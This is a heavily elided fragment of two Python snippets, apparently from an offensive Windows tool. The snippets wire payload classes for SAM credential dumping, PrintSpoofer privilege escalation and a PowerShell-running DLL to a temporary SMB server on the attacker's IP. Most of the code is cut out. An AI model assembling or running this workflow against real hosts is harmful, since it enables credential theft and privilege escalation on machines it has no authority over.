...
```python3
from payload import SamDumpPowershell, PrintSpoofer, PowershellFileRunner
from tempsmbserver import TempSMB
...
with TempSMB(local_ip=local_ip) as smb:
    ...
    if print_spoofer:
        ...
        runner_payload = PowershellFileRunner(smb, [print_spoofer_payload.file])
    else:
        runner_payload = PowershellFileRunner(smb, [sam_dump_payload.file])
...
```python3
from payload import CRunPowershellDll
from tempsmbserver import TempSMB
...
with TempSMB(local_ip=local_ip) as smb:
    ...
    dll_payload = CRunPowershellDll(smb, [powershell_file])
